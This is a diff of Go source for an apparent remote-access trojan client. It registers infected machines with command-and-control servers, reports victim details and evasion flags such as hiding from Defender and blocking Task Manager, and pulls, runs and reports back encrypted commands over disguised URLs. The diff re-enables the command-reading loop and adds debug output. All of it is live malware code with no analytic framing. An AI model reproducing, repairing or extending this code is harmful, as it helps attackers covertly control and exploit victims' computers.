@@ -19,13 +19,15 @@ import (
 )
 
 func Ping(c2 string) bool { //Test Connection to see if its a working C2
-	if strings.Contains(c2, "https://") {
+	if strings.Contains(c2, "http://") {
+		fmt.Println("Command Control Connection", c2)
 		transport := &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
 		}
 		c := http.Client{Transport: transport, Timeout: time.Duration(15) * time.Second}
 		resp, err := c.Get(c2 + "ping?id=" + MyID)
 		if err != nil {
+			fmt.Println("Command Control Connection Error", err)
 			return false
 		}
 		defer resp.Body.Close()
@@ -44,7 +46,7 @@ func GetSettingsC2() { //Gets last settings from C2
 		for i := 0; i < len(C2); i++ {
 			isC2 := Ping(C2[i]) //Test Connection to see if its a working C2
 			if isC2 {
-				//fmt.Println("Gettings Settings....", C2[i])
+				fmt.Println("Gettings Settings....", C2[i])
 				transport := &http.Transport{
 					TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
 				}
@@ -61,9 +63,9 @@ func GetSettingsC2() { //Gets last settings from C2
 						if err == nil {
 
 							Decrypted := XXTeaDecrypt(decoded, []byte(EncryptionPassword))
-							//fmt.Println(string(Decrypted))
+							fmt.Println(string(Decrypted))
 							if string(Decrypted) == "failed" { //No settings for the Client on the C2, Go NewClient
-								//fmt.Println("Need to Register with C2")
+								fmt.Println("Need to Register with C2")
 								RegisteredWithC2 = false
 								go NewClientC2(C2[i])
 							} else {
@@ -111,7 +113,7 @@ func GetSettingsC2() { //Gets last settings from C2
 								}
 
 								RegisteredWithC2 = true
-								//go ReadC2() // Start Command Routine
+								go ReadC2() // Start Command Routine
 							}
 						}
 					}
@@ -125,7 +127,7 @@ func NewClientC2(C2 string) { //Sends all base information to C2 (IP, OS, States
 	isC2 := Ping(C2) //Test Connection to see if its a working C2
 	if isC2 {
 	Retry:
-		//fmt.Println("Registering with C2", C2)
+		fmt.Println("Registering with C2", C2)
 		tr := &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
 		}
@@ -145,7 +147,7 @@ func NewClientC2(C2 string) { //Sends all base information to C2 (IP, OS, States
 			strconv.FormatBool(HideFromDefender), strconv.FormatBool(AntiProcessWindow),
 			strconv.FormatBool(AntiProcess), strconv.FormatBool(BlockTaskManager)}
 		res, _ := json.Marshal(clientJson)
-
+		fmt.Println("clientJson marshalled successfully: ", string(res))
 		var output string
 		output += string(res)
 
@@ -160,6 +162,9 @@ func NewClientC2(C2 string) { //Sends all base information to C2 (IP, OS, States
 		req.Header.Set("User-Agent", UserAgent)
 		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 		resp, err := client.Do(req)
+		if err != nil {
+			fmt.Println("Register failed : ", err)
+		}
 		if err == nil {
 			body, err := ioutil.ReadAll(resp.Body)
 			if err == nil {
@@ -173,7 +178,7 @@ func NewClientC2(C2 string) { //Sends all base information to C2 (IP, OS, States
 				fmt.Println("REGISTERED WITH C2")
 				//DEBUG
 				RegisteredWithC2 = true
-				//go ReadC2()
+				go ReadC2()
 				//go ImagesC2(true, false)
 				go ImagesC2(false, false)
 
@@ -197,7 +202,7 @@ func ReadC2() { //Checks for commands
 					isC2 := Ping(C2[i]) //Test Connection to see if its a working C2
 					if isC2 {
 						//DEBUG
-						//fmt.Println("Reading C2", C2[i])
+						fmt.Println("Reading C2", C2[i])
 						//DEBUG
 						transport := &http.Transport{
 							TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
@@ -209,12 +214,18 @@ func ReadC2() { //Checks for commands
 						req.Header.Set("User-Agent", UserAgent)
 
 						resp, err := client.Do(req)
+						if err != nil {
+							fmt.Println("Error reading articles: ", err)
+						}
 						if err == nil {
 
 							body, err := ioutil.ReadAll(resp.Body)
 							if err == nil {
 								_ = resp.Body.Close()
 								decoded, err := base64.RawURLEncoding.DecodeString(string(body))
+								if err != nil {
+									fmt.Println("Error reading articles body: ", err)
+								}
 								if err == nil {
 
 									Decrypted := XXTeaDecrypt(decoded, []byte(EncryptionPassword))
@@ -234,7 +245,7 @@ func ReadC2() { //Checks for commands
 												break
 											}
 											fmt.Println("ISSUE NEW COMMANDS TO COMMAND ROUTINE")
-											//fmt.Println(cmds.Id, cmds.DAT, cmds.Parameters)
+											fmt.Println(cmds.Id, cmds.DAT, cmds.Parameters)
 											go HandleCommands(cmds.Id, cmds.DAT, cmds.Parameters)
 										}
 									}
@@ -267,10 +278,10 @@ func CommandUpdateC2(id string, status string) { //Sends back if its Completed a
 
 					var output string
 					output += string(res)
-
+					fmt.Println("Sends back command response: ", output)
 					Encrypted := XXTeaEncrypt([]byte(output), []byte(EncryptionPassword))
 					encoded := base64.RawURLEncoding.EncodeToString(Encrypted)
-					//fmt.Println(MyID, encoded)
+					fmt.Println(MyID, encoded)
 					data.Add("id", MyID)
 					data.Add("data", encoded)
 					u, _ := url.ParseRequestURI(C2[i] + "articles/" + RandomString(rand.Intn(15-3)+3) + "/" + RandomString(rand.Intn(15-3)+3) + "/edit.html")
